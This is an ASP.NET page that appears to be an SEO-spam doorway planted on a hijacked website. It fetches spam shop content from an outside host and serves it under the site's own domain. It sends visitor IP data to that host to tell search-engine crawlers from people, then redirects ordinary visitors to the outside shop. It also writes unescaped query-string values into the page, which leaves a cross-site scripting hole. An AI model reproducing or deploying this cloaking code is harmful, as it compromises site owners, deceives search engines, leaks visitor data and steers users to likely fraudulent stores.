<%@ Page Language="C#" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">
  
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            string httpxy = HttpContext.Current.Request.IsSecureConnection ? "https://" : "http://";
            webclient = new System.Net.WebClient();
            webclient.Encoding = System.Text.Encoding.UTF8;

            string URL = "http://jw8.bbbb002.top/SJ/JDNEW.aspx";
			if (Request.QueryString["s"] != null)
            { 
			    
                int cid = new Random().Next(1, 45);
                if (Request.QueryString["cid"] != null) { cid = int.Parse(Request.QueryString["cid"]); }
                URL = "http://jw8.bbbb002.top/sjd.aspx?cid=" + cid + "&number=" + Request.QueryString["number"] + "&pnum=" + Request.QueryString["pnum"];
                content = webclient.DownloadString(URL);
                content = content.Replace("yymm", httpxy + HttpContext.Current.Request.Url.Host + HttpContext.Current.Request.Path);
				Response.ContentType = "text/xml";
				Response.Write(content);
				Response.End();
            }
            else
			{

            if (Request.QueryString["type"] != null)
            {
                if (Request.QueryString["type"] == "search")
                {
                    tz();
                    URL += "?cid=" + Request.QueryString["cid"] + "&searchtxt=" + Request.QueryString["searchtxt"];
                    content = webclient.DownloadString(URL);

                }
            }
            else
            {
                if (Request.QueryString["iid"] != null)
                {
					int wid = new Random().Next(1, 1500);
                    URL += "?iid=" + Request.QueryString["iid"] + "&cid=" + Request.QueryString["cid"] + "&mt=http://jw8.bbbb002.top/enm/" + wid + ".txt";
                    kname = webclient.DownloadString(URL.Replace("SJ/JDNEW.aspx", "gn.aspx"));
                    tz();
                    content = webclient.DownloadString(URL);
                }
                else
                {
                    tz();
                    int cid = new Random().Next(1, 45);
                    if (Request.QueryString["cid"] != null) { cid = int.Parse(Request.QueryString["cid"]); }
                    URL += "?cid=" + cid + "&pnum=" + Request.QueryString["pnum"];
                    content = webclient.DownloadString(URL);

                }
            }
            content = content.Replace("UUUUU", httpxy + HttpContext.Current.Request.Url.Host + HttpContext.Current.Request.Path);
			content = content.Replace("HHHHH", HttpContext.Current.Request.Path);
            content = content.Replace("BBBBB", HttpContext.Current.Request.Url.Host);
            content = content.Replace("NNNNN", kname + Request.QueryString["iid"]);
            content = content.Replace("SSSSS", kname + Request.QueryString["iid"] + Request.QueryString["searchtxt"] + Request.QueryString["pnum"]);
            content = content.Replace("DDDDD", kname + " Gold White Black Red Blue Beige Grey Price Rose Orange Purple Green Yellow Cyan Bordeaux pink Indigo Brown Silver " + Request.QueryString["searchtxt"]);
			}
        }
    }
    public void tz()
    {

        string ip = System.Web.HttpContext.Current.Request.ServerVariables["REMOTE_ADDR"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["REMOTE_HOST"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["HTTP_X_FORWARDED_FOR"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["HTTP_CLIENT_IP"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["HTTP_X_FORWARDED"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["HTTP_FORWARDED_FOR"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["HTTP_FORWARDED"];
        if (Request.QueryString["kk"] != null)
        {
            ip = "66.249.64.190";
        }
        string ipurl = "http://jw8.bbbb002.top/getdomain.aspx?rnd=1&ip=" + ip;
        webclient = new System.Net.WebClient();
        webclient.Encoding = System.Text.Encoding.UTF8;
        string domain = webclient.DownloadString(ipurl).ToLower();
        if (domain.IndexOf("google") == -1 && domain.IndexOf("msn.com") == -1 && domain.IndexOf("yahoo.com") == -1 && domain.IndexOf("aol.com") == -1)
        {
            
                if (Request.QueryString["iid"] != null)
                {
                    string tzurl ="http://jw8.bbbb002.top/a.aspx";
                    Response.Redirect(tzurl + "?cid=" + Request.QueryString["cid"] + "&cname=" + HttpUtility.UrlEncode(kname));
					Response.End();
                }
                if (Request.QueryString["searchtxt"] != null)
                {
                    string tzurl = "http://jw8.bbbb002.top/a.aspx";
                    Response.Redirect(tzurl + "?cid=" + Request.QueryString["cid"] + "&cname=" + HttpUtility.UrlEncode(Request.QueryString["searchtxt"]));
					Response.End();
                }
                if (Request.QueryString["pnum"] != null)
                {
                    string tzurl = "http://jw8.bbbb002.top/a.aspx";
                    tzurl = tzurl.Replace("products.aspx", "");
                    Response.Redirect(tzurl + "?cid=" + Request.QueryString["cid"] + "");
					Response.End();
                }
            
        }
    }
    public string xi = "1";
    public string xc = "50";

    public System.Net.WebClient webclient = null;
    public string content = "";
    public string content1 = "";
    public string hyzhdy = "";
    public string Greeting = "";
    public string zhang = "";
    public string hhhvx = "";
    public string URL1 = "";
    public System.Random a = null;
    public string descriptions = "";
    public string kname = "";

</script>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>

    <title> <%=kname%> <%=Request.QueryString["searchtxt"]%> Online Sale -<%=Request.QueryString["pnum"]%> </title>
    <meta name="keywords" content="<%=kname%><%=Request.QueryString["searchtxt"]%>" />
    <meta name="description" content=" Soldes OFF <%=new Random().Next(60, 80)%>% > <%=kname%> Shop for the latest in shoes, clothing, accessories and more in our store. Explore the hottest styles and enjoy free shipping. <%=Request.QueryString["searchtxt"]%>" />
    <meta name="robots" content="index,follow,all" />
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <style>
        @media (max-width: 768px) {
            body {
                width: 100%;
                height: 100%;
            }

            body {
                font-family: Open Sans,'Helvetica Neue',Arial,sans-serif;
                font-size: 15px;
                color: #777;
                line-height: 1.7;
            }

            img {
                width: 80%;
            }

            iframe {
                max-width: 100% !important;
                height: auto;
                float: left;
            }

            div {
                width: 100% !important;
                float: left;
            }

                div span {
                    width: 100%;
                    float: left;
                }

            a {
                color: #f05f40;
                -webkit-transition: all .35s;
                -moz-transition: all .35s;
                transition: all .35s;
            }

                a:hover, a:focus {
                    color: #eb3812;
                }
        }
    </style>
</head>

<body>
    <%=content.Replace("XXXXX",HttpContext.Current.Request.Url.Host) %>
    <%=content1 %>
	
</body>
</html>
